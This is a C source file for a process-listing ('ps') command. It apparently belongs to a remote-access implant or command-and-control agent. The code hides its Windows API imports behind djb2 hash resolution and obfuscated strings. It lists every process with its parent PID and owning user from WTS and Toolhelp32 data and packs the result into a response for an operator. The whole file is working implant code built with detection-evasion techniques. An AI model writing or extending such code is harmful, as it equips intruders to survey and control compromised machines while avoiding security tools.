#include "config.h"
#ifdef INCLUDE_CMD_PS

#include "commands.h"
#include <tlhelp32.h>

// WTSEnumerateProcessesW gives us process name + PID + owner SID for every
// process in a single call - far more reliable than per-PID token queries.
typedef BOOL  (WINAPI *fn_WTSEnumerateProcessesW)(void*, DWORD, DWORD, void**, DWORD*);
typedef void  (WINAPI *fn_WTSFreeMemory)(void*);
typedef BOOL  (WINAPI *fn_LookupAccountSidW_t)(LPCWSTR, void*, LPWSTR, LPDWORD, LPWSTR, LPDWORD, LPVOID);
typedef int   (WINAPI *fn_WideCharToMultiByte_t)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
typedef BOOL  (WINAPI *fn_OpenProcessToken_t)(HANDLE, DWORD, PHANDLE);
typedef BOOL  (WINAPI *fn_GetTokenInformation_t)(HANDLE, DWORD, LPVOID, DWORD, PDWORD);

// WTS_PROCESS_INFO_W layout (x64):
// DWORD SessionId; DWORD ProcessId; LPWSTR pProcessName; PSID pUserSid;
#define WTS_PI_SESSIONID   0
#define WTS_PI_PROCESSID   4
#define WTS_PI_NAME        8
#define WTS_PI_USERSID     16
#define WTS_ENTRY_SIZE     24

// small SID -> name cache (most processes share an owner)
struct SID_CACHE {
    BYTE  sid[68];
    DWORD sid_len;
    char  name[128];
};

static int _sid_cache_find(SID_CACHE* cache, int count, const BYTE* sid, DWORD sid_len) {
    for (int i = 0; i < count; i++) {
        if (cache[i].sid_len != sid_len) continue;
        BOOL same = TRUE;
        for (DWORD j = 0; j < sid_len; j++) {
            if (cache[i].sid[j] != sid[j]) { same = FALSE; break; }
        }
        if (same) return i;
    }
    return -1;
}

// ps: PID\tPPID\tUSER\tName per line
VOID cmd_ps(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    xstr(_wts, "wtsapi32.dll");
    xstr(_kbase, "kernelbase.dll");
    xstr(_adv, "advapi32.dll");

    HMODULE h_wts = inst->Win32.LoadLibraryA(_wts);
    HMODULE h_kbase = inst->Win32.LoadLibraryA(_kbase);
    HMODULE h_adv = inst->Win32.LoadLibraryA(_adv);

    fn_WTSEnumerateProcessesW pWtsEnum = h_wts ?
        (fn_WTSEnumerateProcessesW)resolve_function((PVOID)h_wts, hash_string_djb2(XSTR("WTSEnumerateProcessesW"))) : NULL;
    fn_WTSFreeMemory pWtsFree = h_wts ?
        (fn_WTSFreeMemory)resolve_function((PVOID)h_wts, hash_string_djb2(XSTR("WTSFreeMemory"))) : NULL;
    fn_LookupAccountSidW_t pLookupAccountSidW = h_adv ?
        (fn_LookupAccountSidW_t)resolve_function((PVOID)h_adv, hash_string_djb2(XSTR("LookupAccountSidW"))) : NULL;
    fn_WideCharToMultiByte_t pWideCharToMultiByte = h_kbase ?
        (fn_WideCharToMultiByte_t)resolve_function((PVOID)h_kbase, hash_string_djb2(XSTR("WideCharToMultiByte"))) : NULL;
    fn_OpenProcessToken_t pOpenProcessToken = h_kbase ?
        (fn_OpenProcessToken_t)resolve_function((PVOID)h_kbase, hash_string_djb2(XSTR("OpenProcessToken"))) : NULL;
    fn_GetTokenInformation_t pGetTokenInformation = h_kbase ?
        (fn_GetTokenInformation_t)resolve_function((PVOID)h_kbase, hash_string_djb2(XSTR("GetTokenInformation"))) : NULL;
    if (!pOpenProcessToken && h_adv)
        pOpenProcessToken = (fn_OpenProcessToken_t)resolve_function((PVOID)h_adv, hash_string_djb2(XSTR("OpenProcessToken")));
    if (!pGetTokenInformation && h_adv)
        pGetTokenInformation = (fn_GetTokenInformation_t)resolve_function((PVOID)h_adv, hash_string_djb2(XSTR("GetTokenInformation")));

    // Fallback: Toolhelp32 snapshot without users when WTS is unavailable
    if (!pWtsEnum || !pWtsFree) {
        HANDLE hSnap = inst->Win32.CreateToolhelp32Snapshot(0x00000002, 0);
        if (hSnap == INVALID_HANDLE_VALUE) {
            package_add_string(inst, response, XSTR("Failed to create snapshot"));
            response->is_error = TRUE;
            return;
        }
        PROCESSENTRY32 pe;
        es_memset(&pe, 0, sizeof(pe));
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (!inst->Win32.Process32First(hSnap, &pe)) {
            gate_CloseHandle(inst, hSnap);
            return;
        }
        do {
            char line[512] = {0};
            int pos = 0;
            DWORD pid = pe.th32ProcessID, ppid = pe.th32ParentProcessID;
            char tmp[16]; int ti = 0;
            for (int f = 0; f < 2; f++) {
                DWORD v = f == 0 ? pid : ppid;
                ti = 0;
                if (v == 0) line[pos++] = '0';
                else { while (v > 0) { tmp[ti++] = '0' + (v % 10); v /= 10; }
                       for (int j = ti - 1; j >= 0; j--) line[pos++] = tmp[j]; }
                line[pos++] = '\t';
            }
            line[pos++] = '-'; line[pos++] = '\t';
            for (int i = 0; pe.szExeFile[i] && pos < 500; i++) line[pos++] = pe.szExeFile[i];
            line[pos++] = '\n';
            package_add_bytes(inst, response, (BYTE*)line, pos);
        } while (inst->Win32.Process32Next(hSnap, &pe));
        gate_CloseHandle(inst, hSnap);
        return;
    }

    void* p_info = NULL;
    DWORD count = 0;
    if (!pWtsEnum(NULL, 0, 1, &p_info, &count) || !p_info) {
        package_add_string(inst, response, XSTR("WTSEnumerateProcesses failed"));
        response->is_error = TRUE;
        return;
    }

    // PPID lookup: WTS doesn't provide it, so cross-reference a Toolhelp snapshot
    HANDLE hSnap = inst->Win32.CreateToolhelp32Snapshot(0x00000002, 0);
    struct PP_MAP { DWORD pid; DWORD ppid; };
    PP_MAP pp_map[512];
    DWORD pp_count = 0;
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        es_memset(&pe, 0, sizeof(pe));
        pe.dwSize = sizeof(PROCESSENTRY32);
        if (inst->Win32.Process32First(hSnap, &pe)) {
            do {
                if (pp_count < 512) {
                    pp_map[pp_count].pid = pe.th32ProcessID;
                    pp_map[pp_count].ppid = pe.th32ParentProcessID;
                    pp_count++;
                }
            } while (inst->Win32.Process32Next(hSnap, &pe));
        }
        gate_CloseHandle(inst, hSnap);
    }

    fn_LookupAccountSidW_t lookup = pLookupAccountSidW ? pLookupAccountSidW :
        (fn_LookupAccountSidW_t)resolve_function((PVOID)h_adv, hash_string_djb2(XSTR("LookupAccountSidW")));

    // SID -> name cache
    SID_CACHE cache[24];
    int cache_count = 0;

    for (DWORD i = 0; i < count; i++) {
        BYTE* entry = (BYTE*)p_info + (i * WTS_ENTRY_SIZE);
        DWORD pid = *(DWORD*)(entry + WTS_PI_PROCESSID);
        wchar_t* wname = *(wchar_t**)(entry + WTS_PI_NAME);
        void* sid = *(void**)(entry + WTS_PI_USERSID);

        char line[768] = {0};
        int pos = 0;

        // PID
        char tmp[16]; int ti = 0;
        DWORD v = pid;
        if (v == 0) line[pos++] = '0';
        else { while (v > 0) { tmp[ti++] = '0' + (v % 10); v /= 10; }
               for (int j = ti - 1; j >= 0; j--) line[pos++] = tmp[j]; }
        line[pos++] = '\t';

        // PPID from snapshot
        DWORD ppid = 0;
        for (DWORD m = 0; m < pp_count; m++) {
            if (pp_map[m].pid == pid) { ppid = pp_map[m].ppid; break; }
        }
        ti = 0;
        if (ppid == 0) line[pos++] = '0';
        else { while (ppid > 0) { tmp[ti++] = '0' + (ppid % 10); ppid /= 10; }
               for (int j = ti - 1; j >= 0; j--) line[pos++] = tmp[j]; }
        line[pos++] = '\t';

        // USER: per-pid token query (works reliably for same-user processes)
        char user[128] = {0};
        DWORD ulen = 0;
        user[ulen++] = '-';
        if (pOpenProcessToken && pGetTokenInformation && pid != 0) {
            HANDLE h_proc = inst->Win32.OpenProcess(
                0x1000 /*PROCESS_QUERY_LIMITED_INFORMATION*/, FALSE, pid);
            if (h_proc) {
                HANDLE h_tok = NULL;
                if (pOpenProcessToken(h_proc, 0x0008 /*TOKEN_QUERY*/, &h_tok)) {
                    BYTE user_buf[128];
                    DWORD needed = 0;
                    if (pGetTokenInformation(h_tok, 1 /*TokenUser*/, user_buf, sizeof(user_buf), &needed) && needed >= 8) {
                        BYTE* sid = (BYTE*)(*(void**)user_buf);
                        if (sid) {
                            int ci = -1;
                            for (int cidx = 0; cidx < cache_count; cidx++) {
                                if (cache[cidx].sid_len == (DWORD)sid[1] * 4 + 8) {
                                    BOOL same = TRUE;
                                    for (DWORD s = 0; s < (DWORD)sid[1] * 4 + 8; s++) {
                                        if (cache[cidx].sid[s] != sid[s]) { same = FALSE; break; }
                                    }
                                    if (same) { ci = cidx; break; }
                                }
                            }
                            if (ci >= 0) {
                                for (ulen = 0; cache[ci].name[ulen]; ulen++) user[ulen] = cache[ci].name[ulen];
                            } else if (lookup) {
                                wchar_t wname[64] = {0}, wdom[64] = {0};
                                DWORD wname_len = 64, wdom_len = 64;
                                int use = 0;
                                if (lookup(NULL, sid, wname, &wname_len, wdom, &wdom_len, &use)) {
                                    char nb[64] = {0}, db[64] = {0};
                                    if (pWideCharToMultiByte) {
                                        pWideCharToMultiByte(0 /*CP_ACP*/, 0, wname, -1, nb, 64, NULL, NULL);
                                        pWideCharToMultiByte(0, 0, wdom, -1, db, 64, NULL, NULL);
                                    }
                                    ulen = 0;
                                    BOOL have_dom = FALSE;
                                    for (int d = 0; db[d]; d++) if (db[d] != ' ') { have_dom = TRUE; break; }
                                    if (have_dom) {
                                        for (int d = 0; db[d] && ulen < 60; d++) user[ulen++] = db[d];
                                        user[ulen++] = '\\';
                                    }
                                    for (int n = 0; nb[n] && ulen < 126; n++) user[ulen++] = nb[n];
                                    user[ulen] = '\0';
                                    if (cache_count < 24) {
                                        SID_CACHE* c = &cache[cache_count++];
                                        es_memset(c, 0, sizeof(SID_CACHE));
                                        DWORD sl = (DWORD)sid[1] * 4 + 8;
                                        for (DWORD s = 0; s < sl; s++) c->sid[s] = sid[s];
                                        c->sid_len = sl;
                                        for (DWORD s = 0; s < ulen && s < 127; s++) c->name[s] = user[s];
                                    }
                                }
                            }
                        }
                    }
                    gate_CloseHandle(inst, h_tok);
                }
                gate_CloseHandle(inst, h_proc);
            }
            if (ulen == 0) user[ulen++] = '-';
        }
        for (DWORD u = 0; u < ulen && pos < 600; u++) line[pos++] = user[u];
        line[pos++] = '\t';

        // Name
        if (wname) {
            char nb[260] = {0};
            if (pWideCharToMultiByte)
                pWideCharToMultiByte(0 /*CP_ACP*/, 0, wname, -1, nb, 260, NULL, NULL);
            for (int n = 0; nb[n] && pos < 750; n++) line[pos++] = nb[n];
        }

        line[pos++] = '\n';
        package_add_bytes(inst, response, (BYTE*)line, pos);
    }

    pWtsFree(p_info);
}

#endif
